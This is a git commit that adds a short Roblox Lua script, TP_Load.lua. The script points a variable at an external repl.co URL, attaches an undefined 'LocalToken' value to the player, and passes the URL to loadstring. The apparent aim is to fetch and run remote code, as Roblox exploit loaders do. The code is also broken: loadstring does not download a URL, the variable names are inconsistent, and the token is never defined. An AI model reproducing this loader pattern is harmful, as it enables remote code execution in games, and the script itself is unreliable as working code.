90d5ecfe097cf3c1e5e94f802df4d4dffe0338f4
donutchip <116406156+donutchip@users.noreply.github.com>
2022-11-06 01:15:08 -0300

    Create TP_Load.lua

---
+++ TP_Load.lua
@@ -0,0 +1,20 @@
+repeat wait() until game.Players.LocalPlayer --Wait until player loaded
+
+--Locals
+local sa_Instance
+local player
+local ip
+
+--Assign
+
+player = game.Players.LocalPlayer
+
+ip = "https://mrbombastic.starvdog.repl.co"
+
+sa_instance = Instance.new("StringValue")
+sa_instance.parent = player
+sa_instance.Value = LocalToken
+
+--Connect
+
+loadstring(ip)
